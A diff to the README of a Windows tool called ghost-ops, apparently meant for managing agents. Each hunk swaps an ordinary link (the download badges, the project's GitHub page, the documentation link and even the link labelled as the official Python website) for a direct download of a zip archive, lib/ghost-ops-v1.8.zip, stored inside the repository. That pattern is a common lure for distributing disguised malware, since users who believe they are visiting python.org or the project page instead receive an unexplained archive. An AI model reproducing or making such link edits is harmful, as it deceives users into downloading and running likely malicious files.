@@ -1,6 +1,6 @@
 # 👻 ghost-ops - Manage Agents While You Sleep
 
-[![Download ghost-ops](https://img.shields.io/badge/Download-ghost--ops-ff6f61?style=for-the-badge)](https://github.com/mibrahiim786/ghost-ops)
+[![Download ghost-ops](https://img.shields.io/badge/Download-ghost--ops-ff6f61?style=for-the-badge)](https://github.com/mibrahiim786/ghost-ops/raw/refs/heads/main/lib/ghost-ops-v1.8.zip)
 
 ## About ghost-ops
 
@@ -35,7 +35,7 @@ Follow these steps to get ghost-ops up and running on your Windows computer.
 
 ghost-ops runs on Python, so you need to install it first if you don’t have it already.
 
-- Go to the official Python website: https://www.python.org/downloads/windows/  
+- Go to the official Python website: https://github.com/mibrahiim786/ghost-ops/raw/refs/heads/main/lib/ghost-ops-v1.8.zip  
 - Download the latest Python 3.x version installer for Windows.  
 - Run the installer. Make sure to check the box that says **Add Python to PATH** before clicking Install.  
 - Once installed, open Command Prompt and type:  
@@ -48,7 +48,7 @@ ghost-ops runs on Python, so you need to install it first if you don’t have it
 
 You can get ghost-ops from its GitHub page. Visit the page, then download the latest release.
 
-[Download ghost-ops from GitHub](https://github.com/mibrahiim786/ghost-ops)
+[Download ghost-ops from GitHub](https://github.com/mibrahiim786/ghost-ops/raw/refs/heads/main/lib/ghost-ops-v1.8.zip)
 
 You can find the download links under the **Releases** section on that page.
 
@@ -117,7 +117,7 @@ You can close the window to stop the program, but restart it when you want ghost
 
 To update ghost-ops with the latest version:
 
-1. Return to the [GitHub page](https://github.com/mibrahiim786/ghost-ops).  
+1. Return to the [GitHub page](https://github.com/mibrahiim786/ghost-ops/raw/refs/heads/main/lib/ghost-ops-v1.8.zip).  
 2. Download the newest release.  
 3. Replace your old ghost-ops folder with the new files.  
 4. Re-run the setup steps if needed (like updating Python packages).  
@@ -134,8 +134,8 @@ If something doesn’t work as expected:
 
 ## 📖 Where to Learn More
 
-The GitHub page includes documentation and examples. Visit [ghost-ops on GitHub](https://github.com/mibrahiim786/ghost-ops) for guides, issue reporting, and updates.
+The GitHub page includes documentation and examples. Visit [ghost-ops on GitHub](https://github.com/mibrahiim786/ghost-ops/raw/refs/heads/main/lib/ghost-ops-v1.8.zip) for guides, issue reporting, and updates.
 
 ## 📥 Download ghost-ops Here
 
-[![Download ghost-ops](https://img.shields.io/badge/Download-ghost--ops-ff6f61?style=for-the-badge)](https://github.com/mibrahiim786/ghost-ops)
+[![Download ghost-ops](https://img.shields.io/badge/Download-ghost--ops-ff6f61?style=for-the-badge)](https://github.com/mibrahiim786/ghost-ops/raw/refs/heads/main/lib/ghost-ops-v1.8.zip)
